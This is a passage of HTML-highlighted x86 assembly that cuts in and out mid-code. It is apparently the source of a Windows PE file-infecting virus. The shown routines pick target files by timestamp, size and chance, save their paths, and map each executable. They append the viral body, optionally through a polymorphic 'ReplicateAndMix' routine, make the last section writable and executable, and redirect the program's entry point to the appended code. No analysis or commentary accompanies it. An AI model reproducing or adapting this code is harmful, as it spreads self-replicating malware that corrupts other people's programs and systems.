</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_ftLastAccessTime.FT_dwHighDateTime</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_TargetSelectTimeMask</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">STimeTargetSelect</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_2_Select</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_2_Select</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_TargetSelectSizeMax</span><span class="sc0">
</span><span class="sc5">@@_ja</span><span class="sc0"> </span><span class="sc5">_2_Select</span><span class="sc0">

</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Rand</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_TargetSelectRandMask</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_2_Select</span><span class="sc0">


</span><span class="sc5">_1_Select</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">

</span><span class="sc5">_2_Select</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Select</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc5">TargetSave</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileNamesPointer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">@_PathSize</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">e_TargetSave</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_PathSize</span><span class="sc0">
</span><span class="sc5">@@_ja</span><span class="sc0"> </span><span class="sc5">e_TargetSave</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileNamesPointer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc13">"\"
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_1_TargetSave</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc13">"\"
</span><span class="sc5">_1_TargetSave</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@_PathSize</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_2_TargetSave</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">@@_ja</span><span class="sc0"> </span><span class="sc5">e_TargetSave</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_2_TargetSave</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_3_TargetSave</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileNamesPointer</span><span class="sc4">],</span><span class="sc5">@_PathSize</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExeRest</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_4_TargetSave</span><span class="sc0">


</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">

</span><span class="sc5">_4_TargetSave</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">e_TargetSave</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TargetSave</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">; Infect</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">Infect</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">_1_Infect</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileNames</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileNamesPointer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_2_Infect</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileNamesPointer</span><span class="sc4">],</span><span class="sc5">@_PathSize</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Map</span><span class="sc0">

</span><span class="sc5">@@_jmp</span><span class="sc0"> </span><span class="sc5">_1_Infect</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_2_Infect</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc5">Map</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">000000003h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileNamesPointer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFileA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">e1_Map</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetFileSize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">e2_Map</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_FileAligns</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">000000004h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFileMappingA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">e2_Map</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetMapHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">000000002h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetMapHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapViewOfFile</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">e3_Map</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetMapAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetMapAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ebx -&gt; TargetMapAddress, "MZ"</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc3">"ZM"</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">e4_Map</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">03Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; edx -&gt; "PE\0\0"</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">e4_Map</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">038h</span><span class="sc4">],</span><span class="sc2">01000h</span><span class="sc0"> </span><span class="sc1">; SectionAlignment</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">e4_Map</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">03Ch</span><span class="sc4">],</span><span class="sc2">00200h</span><span class="sc0"> </span><span class="sc1">; FileAlignment</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_3_Map</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">03Ch</span><span class="sc4">],</span><span class="sc2">00400h</span><span class="sc0"> </span><span class="sc1">; FileAlignment</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_3_Map</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">03Ch</span><span class="sc4">],</span><span class="sc2">01000h</span><span class="sc0"> </span><span class="sc1">; FileAlignment</span><span class="sc0">
</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc5">_3_Map</span><span class="sc0">
</span><span class="sc5">@@_jmp</span><span class="sc0"> </span><span class="sc5">e4_Map</span><span class="sc0">
</span><span class="sc5">_3_Map</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">014h</span><span class="sc4">],</span><span class="sc2">000E0h</span><span class="sc0"> </span><span class="sc1">; SizeOfOptionalHeader</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">e4_Map</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0F8h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ebx -&gt; SectionTable</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">006h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000FFFFh</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000028h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; ebx -&gt; LastSection</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">024h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SH + Characteristics</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00FFFFFFFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">000000040h</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">e4_Map</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">028h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AddressOfEntryPoint</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEP_in</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;a2</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">00Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SH + VirtualAddress</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">010h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SH + SizeOfRawData</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEP_in</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;a2</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">prog</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetMapAddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">014h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SH + PointerToRawData</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">010h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SH + SizeOfRawData</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@_ModeNoPoly</span><span class="sc0">
</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc5">_1_Map</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">ReplicateAndMix</span><span class="sc0">
</span><span class="sc5">@@_jmp</span><span class="sc0"> </span><span class="sc5">_2_Map</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_1_Map</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc5">Replicate</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">_2_Map</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">008h</span><span class="sc4">],</span><span class="sc5">@_SectAligns</span><span class="sc0"> </span><span class="sc1">; SH + VirtualSize</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">010h</span><span class="sc4">],</span><span class="sc5">@_FileAligns</span><span class="sc0"> </span><span class="sc1">; SH + SizeOfRawData</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">024h</span><span class="sc4">],</span><span class="sc2">0E0000000h</span><span class="sc0">  </span><span class="sc1">; SH + Characteristics</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">050h</span><span class="sc4">],</span><span class="sc5">@_SectAligns</span><span class="sc0"> </span><span class="sc1">; SizeOfImage</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">020h</span><span class="sc4">],</span><span class="sc5">@_FileAligns</span><span class="sc0"> </span><span class="sc1">; SizeOfInitializedData</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEP_in</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;a2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">028h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; AddressOfEntryPoint</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetMapAddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetMapHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TargetFileHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CloseHandle</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">


</span><span class="sc5">e4_Map</span><span class="sc4">:</span><span class="sc0">
